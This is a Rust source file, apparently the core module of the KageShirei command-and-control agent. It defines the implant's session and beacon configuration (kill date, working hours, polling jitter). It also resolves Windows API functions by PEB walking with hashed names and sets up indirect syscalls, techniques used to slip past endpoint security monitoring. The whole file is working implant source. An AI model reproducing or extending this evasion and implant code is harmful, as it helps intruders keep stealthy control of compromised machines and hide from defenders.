#![no_std]
//! # KageShirei Agent Core Module
//!
//! This module provides the core functionality for the KageShirei agent, including session
//! management, configuration settings, and system call resolution for Windows API functions.

pub mod common;
pub mod ldr;

extern crate alloc;

use alloc::{string::String, vec::Vec};
use core::{
    cell::UnsafeCell,
    ffi::c_void,
    ptr::null_mut,
    sync::atomic::{AtomicBool, Ordering},
};

use kageshirei_win32::{
    kernel32::{CreateProcessW, Kernel32},
    ntapi::{
        LdrLoadDll,
        NtDll,
        RtlAllocateHeap,
        RtlCreateHeap,
        RtlCreateProcessParametersEx,
        RtlDestroyHeap,
        RtlFreeHeap,
        RtlGetFullPathNameU,
        RtlReAllocateHeap,
    },
    ntdef::{KUserSharedData, TEB},
};
use ldr::{nt_current_teb, peb_get_module};
use spin::RwLock;

/// Represents a session containing connection information.
pub struct Session {
    /// Indicates if the session is connected.
    pub connected:     bool,
    /// Unique identifier for the session.
    pub id:            String,
    /// Process ID.
    pub pid:           i64,
    /// Parent Process ID.
    pub ppid:          i64,
    /// Thread ID.
    pub tid:           i64,
    /// Encryptor
    pub encryptor_ptr: *mut c_void,
    /// Protocol
    pub protocol_ptr:  *mut c_void,
    /// Formatter
    pub formatter_ptr: *mut c_void,
}

impl Default for Session {
    fn default() -> Self { Self::new() }
}

impl Session {
    /// Creates a new, disconnected session with default values.
    pub const fn new() -> Self {
        Self {
            connected:     false,
            id:            String::new(),
            pid:           0,
            ppid:          0,
            tid:           0,
            encryptor_ptr: null_mut(),
            protocol_ptr:  null_mut(),
            formatter_ptr: null_mut(),
        }
    }

    /// Set the generic pointer to data.
    pub fn set_encryptor_ptr(&mut self, encryptor: *mut c_void) { self.encryptor_ptr = encryptor; }

    /// Set the generic pointer to data.
    pub fn set_protocol_ptr(&mut self, protocol: *mut c_void) { self.protocol_ptr = protocol; }

    /// Set the generic pointer to data.
    pub fn set_formatter_ptr(&mut self, formatter: *mut c_void) { self.formatter_ptr = formatter; }
}

/// Configuration settings for the instance.
pub struct Config {
    /// The unique identifier of the agent, required to poll for tasks
    pub id:               String,
    /// The unix timestamp of the kill date, if any.
    pub kill_date:        Option<i64>,
    /// The working hours for the current day (unix timestamp), if any.
    pub working_hours:    Option<Vec<Option<i64>>>,
    /// The agent polling interval in milliseconds.
    pub polling_interval: u128,
    /// The agent polling jitter in milliseconds.
    pub polling_jitter:   u128,
}

impl Default for Config {
    fn default() -> Self { Self::new() }
}

impl Config {
    /// Creates a new configuration with default values.
    pub const fn new() -> Self {
        Self {
            id:               String::new(),
            kill_date:        None,
            polling_interval: 0,
            polling_jitter:   0,
            working_hours:    None,
        }
    }
}

/// Represents the global instance containing configuration and session information.
pub struct Instance {
    /// Pointer to the Thread Environment Block.
    pub teb:          *mut TEB,
    /// Kernel User Shared Data.
    pub kdata:        *mut KUserSharedData,
    /// NtDll instance for native API calls.
    pub ntdll:        NtDll,
    /// Session information.
    pub session:      Session,
    /// Configuration settings.
    pub config:       Config,
    /// Pointer to Checkin Data
    pub pcheckindata: *mut c_void,
    pub kernel32:     Kernel32,
}

impl Default for Instance {
    fn default() -> Self { Self::new() }
}

impl Instance {
    /// Creates a new instance with default values.
    pub fn new() -> Self {
        Self {
            teb:          null_mut(),
            kdata:        null_mut(),
            ntdll:        NtDll::new(),
            session:      Session::new(),
            config:       Config::new(),
            pcheckindata: null_mut(),
            kernel32:     Kernel32::new(),
        }
    }

    /// Set the generic pointer to data.
    pub fn set_checkin_data(&mut self, data: *mut c_void) { self.pcheckindata = data; }
}

/// Atomic flag to ensure initialization happens only once.
static INIT_INSTANCE: AtomicBool = AtomicBool::new(false);

/// Global mutable instance of the agent.
pub static mut INSTANCE: RwLock<UnsafeCell<Option<Instance>>> = RwLock::new(UnsafeCell::new(None));

/// Retrieves a reference to the global instance of the agent.
///
/// # Safety
///
/// This function is unsafe because it involves mutable static data.
/// The caller must ensure no data races occur when accessing the global instance.
#[expect(
    static_mut_refs,
    reason = "Access to mutable static data is protected by a RwLock, ensuring shared references are safe and \
              preventing data races."
)]
pub unsafe fn instance() -> &'static Instance {
    ensure_initialized();
    let lock = INSTANCE.read();
    (*lock.get()).as_ref().unwrap()
}

/// Retrieves a mutable reference to the global instance of the agent.
///
/// # Safety
///
/// This function is unsafe because it involves mutable static data.
/// The caller must ensure no data races occur when accessing the global instance.
#[expect(
    static_mut_refs,
    reason = "Access to mutable static data is protected by a RwLock, ensuring exclusive access for mutable \
              references and preventing data races."
)]
pub unsafe fn instance_mut() -> &'static mut Instance {
    ensure_initialized();
    let lock = INSTANCE.write(); // Usa `write` per accesso mutabile
    (*lock.get()).as_mut().unwrap()
}

/// Function to ensure that initialization is performed if it hasn't been already.
/// This function is called by `instance` and `instance_mut` to ensure the global instance is
/// initialized before returning a reference to it.
///
/// # Safety
/// This function is unsafe because it involves mutable static data.
unsafe fn ensure_initialized() {
    // Check and call initialize if not already done.
    if !INIT_INSTANCE.load(Ordering::Acquire) {
        init_global_instance();
    }
}

/// Resolves the address and syscall number for a list of indirect syscalls.
///
/// # Arguments
///
/// - `module_base`: A pointer to the base address of the module containing the syscalls.
/// - `...syscalls`: A variadic list of syscall objects, each containing a `hash`, `address`, and
///   `number` field.
///
/// This macro iterates over the provided syscalls, resolving each syscall's address using
/// `ldr_function_addr` and extracting its syscall number using `get_syscall_number`.
///
/// # Example
///
/// ```rust
/// resolve_indirect_syscall!(
///     module_base,
///     instance.ntdll.nt_allocate_virtual_memory,
///     instance.ntdll.nt_free_virtual_memory,
///     instance.ntdll.nt_terminate_thread
/// );
/// ```
macro_rules! resolve_indirect_syscall {
    ($module_base:expr, $( $syscall:expr ),* ) => {
        $(
            // Resolve the address of the syscall using the module base and hash.
            $syscall.address = $crate::ldr::peb_get_function_addr($module_base, $syscall.hash);

            // Extract the syscall number from the resolved address.
            $syscall.number = mod_hhtgates::get_syscall_number($syscall.address);
        )*
    };
}

/// Resolves the address of a direct syscall and casts it to a specific function signature.
///
/// # Arguments
///
/// - `module_base`: A pointer to the base address of the module containing the syscall.
/// - `apicall`: A mutable variable to store the resolved function pointer, which will be cast to
///   the specified function signature.
/// - `hash`: The hash of the API call name to locate in the export table of the module.
/// - `apicall_sig`: The expected function signature for the API call.
///
/// This macro resolves the address of the API call using `peb_get_function_addr` and casts it to
/// the specified function signature using `core::mem::transmute`.
///
/// # Safety
///
/// This macro performs unsafe operations:
/// - Resolving addresses from raw pointers.
/// - Casting the resolved address to a specific function type using `core::mem::transmute`.
///
/// Ensure that:
/// 1. The `module_base` points to a valid module loaded in memory.
/// 2. The `hash` corresponds to a valid API function name.
/// 3. The specified function signature (`apicall_sig`) matches the resolved function's actual
///    signature.
///
/// Misuse of this macro may lead to undefined behavior.
macro_rules! resolve_direct_syscall {
    // Define the macro with the required arguments
    ($module_base:expr, $apicall:expr, $hash:expr, $apicall_sig:ty) => {
        // Resolve the address of the API call using its hash
        let apicall_addr = $crate::ldr::peb_get_function_addr($module_base, $hash);

        // Safely cast the resolved address to the specified function signature
        $apicall = Some(core::mem::transmute::<*mut u8, $apicall_sig>(apicall_addr));
    };
}

/// Initializes the global instance by setting up necessary system call addresses and session data.
unsafe fn init_global_instance() {
    // Check if initialization has already occurred.
    if !INIT_INSTANCE.load(Ordering::Acquire) {
        let mut instance = Instance::new();

        instance.kdata = 0x7ffe0000 as *mut KUserSharedData;
        instance.teb = nt_current_teb();

        // Resolve Ntdll base address
        instance.ntdll.module_base = peb_get_module(0x1edab0ed);

        // Resolve Ntdll syscalls
        resolve_indirect_syscall!(
            instance.ntdll.module_base,
            instance.ntdll.nt_allocate_virtual_memory,
            instance.ntdll.nt_free_virtual_memory,
            instance.ntdll.nt_terminate_thread,
            instance.ntdll.nt_terminate_process,
            instance.ntdll.nt_close,
            instance.ntdll.nt_open_key,
            instance.ntdll.nt_query_value_key,
            instance.ntdll.nt_enumerate_key,
            instance.ntdll.nt_query_information_process,
            instance.ntdll.nt_open_process,
            instance.ntdll.nt_open_process_token,
            instance.ntdll.nt_query_information_token,
            instance.ntdll.nt_delay_execution,
            instance.ntdll.nt_create_thread_ex,
            instance.ntdll.nt_wait_for_single_object,
            instance.ntdll.nt_create_user_process,
            instance.ntdll.nt_create_named_pipe_file,
            instance.ntdll.nt_open_file,
            instance.ntdll.nt_read_file,
            instance.ntdll.nt_read_virtual_memory,
            instance.ntdll.nt_create_process,
            instance.ntdll.nt_query_system_information
        );

        // Resolve LdrLoadDll
        resolve_direct_syscall!(
            instance.ntdll.module_base,
            instance.ntdll.ldr_load_dll,
            0x9e456a43,
            LdrLoadDll
        );

        // Resolve RtlCreateProcessParameters
        resolve_direct_syscall!(
            instance.ntdll.module_base,
            instance.ntdll.rtl_create_process_parameters_ex,
            0x533a05db,
            RtlCreateProcessParametersEx
        );

        // Resolve RtlGetFullPathName_U
        resolve_direct_syscall!(
            instance.ntdll.module_base,
            instance.ntdll.rtl_get_full_path_name_u,
            0xc4415dac,
            RtlGetFullPathNameU
        );

        // Resolve RtlCreateHeap
        resolve_direct_syscall!(
            instance.ntdll.module_base,
            instance.ntdll.rtl_create_heap,
            0xe1af6849,
            RtlCreateHeap
        );
        // Resolve RtlAllocateHeap
        resolve_direct_syscall!(
            instance.ntdll.module_base,
            instance.ntdll.rtl_allocate_heap,
            0x3be94c5a,
            RtlAllocateHeap
        );
        // Resolve RtlFreeHeap
        resolve_direct_syscall!(
            instance.ntdll.module_base,
            instance.ntdll.rtl_free_heap,
            0x73a9e4d7,
            RtlFreeHeap
        );
        // Resolve RtlReAllocateHeap
        resolve_direct_syscall!(
            instance.ntdll.module_base,
            instance.ntdll.rtl_reallocate_heap,
            0xaf740371,
            RtlReAllocateHeap
        );
        // Resolve RtlDestroyHeap
        resolve_direct_syscall!(
            instance.ntdll.module_base,
            instance.ntdll.rtl_destroy_heap,
            0xceb5349f,
            RtlDestroyHeap
        );

        // Resolve Kernel32 base address
        instance.kernel32.module_base = peb_get_module(0x6ddb9555);

        // Resolve CreateProcessW
        resolve_direct_syscall!(
            instance.kernel32.module_base,
            instance.kernel32.create_process_w,
            0xfbaf90cf,
            CreateProcessW
        );

        // Init Session Data
        instance.session.connected = false;
        instance.session.pid = instance.teb.as_ref().unwrap().client_id.unique_process as i64;
        instance.session.tid = instance.teb.as_ref().unwrap().client_id.unique_thread as i64;

        // Init Config Data
        instance.config.polling_interval = 15;
        instance.config.polling_jitter = 10;

        #[expect(
            static_mut_refs,
            reason = "This is a controlled access to a mutable static using a RwLock, ensuring that only one thread \
                      can write at a time and preventing data races."
        )]
        let instance_lock = INSTANCE.write();
        *instance_lock.get() = Some(instance);

        // Set the initialization flag to true.
        INIT_INSTANCE.store(true, Ordering::Release);
    }
}
